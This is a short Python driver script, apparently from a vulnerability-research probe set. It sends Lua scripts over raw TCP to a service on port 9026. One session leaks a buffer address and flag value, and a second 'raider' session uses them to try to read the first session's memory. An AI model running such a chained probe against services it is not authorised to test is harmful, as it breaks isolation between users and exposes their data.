"""Creator holds its ids; raider reports what it reads before touching anything."""
import socket, struct, sys, time, re
HOST = sys.argv[1] if len(sys.argv) > 1 else "192.168.1.121"
def send(src):
    s = socket.create_connection((HOST, 9026), timeout=10); s.settimeout(0.5)
    s.sendall(struct.pack("<Q", len(src)) + src.encode()); return s
def pump(s, until=None, deadline=None):
    out=b""
    while True:
        if deadline and time.time()>deadline: break
        try:
            d=s.recv(65536)
            if not d: break
            out+=d
            if until and re.search(until,out.decode("utf-8","replace")): break
        except socket.timeout:
            if until is None and deadline is None: break
    return out.decode("utf-8","replace")
a=open("probes/phase17_new_vectors/900a_aio_owner_hold.lua",encoding="utf-8").read()
sa=send(a); txt=pump(sa, until=r"FLAG=0x[0-9A-Fa-f]+", deadline=time.time()+8); print(txt,end="")
m=re.search(r"IDBUF=0x([0-9A-Fa-f]+)",txt); f=re.search(r"FLAG=0x([0-9A-Fa-f]+)",txt)
if not m or not f: print("[driver] no IDBUF/FLAG"); sys.exit(1)
addr=int(m.group(1),16); flag=int(f.group(1),16); print(f"[driver] raider reads 0x{addr:X} flag 0x{flag:X}")
b=open("probes/phase17_new_vectors/900b_aio_foreign_readback.lua",encoding="utf-8").read().replace("__IDBUF__",hex(addr)).replace("__FLAG__",hex(flag))
sb=send(b); print(pump(sb, deadline=time.time()+10),end="")
print(pump(sa, deadline=time.time()+10),end="")
